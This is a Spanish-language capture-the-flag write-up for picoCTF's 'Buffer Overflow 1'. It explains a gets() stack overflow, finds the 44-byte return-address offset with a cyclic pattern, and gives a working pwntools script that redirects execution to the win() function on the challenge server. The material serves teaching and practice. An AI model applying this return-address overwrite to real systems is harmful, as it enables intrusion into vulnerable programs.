# Buffer Overflow 1

```bash
file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID\[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   76 Symbols	 No	0	3	vuln
```

```bash
./vuln
Please enter your string:
hola
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

Este binario tiene una vulnerabilidad que permite desbordar el buffer ya que se utiliza en el código un `gets`, el cual es una función insegura que permite desbordar el buffer, consiguiendo sobrescribir elementos importantes del programa como los registros.

```c
void vuln() {
    char buf[BUFSIZE];
    gets(buf); // Función vulnerable
	printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

El programa simplemente pide un string y nos informa de a qué dirección va a saltar el programa (EIP).

Para resolver el ejercicio podemos intentar hallar el offset hasta la dirección de retorno, y una vez lleguemos, mandar la dirección a la que queremos saltar. En este caso queremos saltar a la función `win`, la cual está diseñada para imprimir la flag.

```c
void win() {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt", "r");

    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                       "own debugging flag.\n");
        exit(0);
    }

    fgets(buf, FLAGSIZE, f);
    printf(buf);
}
```

Primero vamos a encontrar el offset:

1. Generamos un patrón

```bash
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

2. Se lo mandamos al programa

```
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
```

3. Miramos qué valor ha tomado el EIP

```bash
EIP  0x6161616c ('laaa')
```

4. Buscamos el offset

```bash
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

El offset es de **44 bytes**.

Ahora que sabemos el offset podemos hacer un script simple que mande después del offset la dirección de la función `win`.

```python
from pwn import *

exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("DIRECCION", IP)
    return r

def main():
    r = conn()
    padding = 44
    payload = flat({
        padding: [
            exe.symbols.win
        ]
    })
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()

```

```bash
python solve.py     
[*] '/home/ub1cu0/Desktop/picoCTF/buffer_overflow_1/vuln_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to saturn.picoctf.net on port 61001: Done
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{SECRETO}
[*] Got EOF while reading in interactive
```
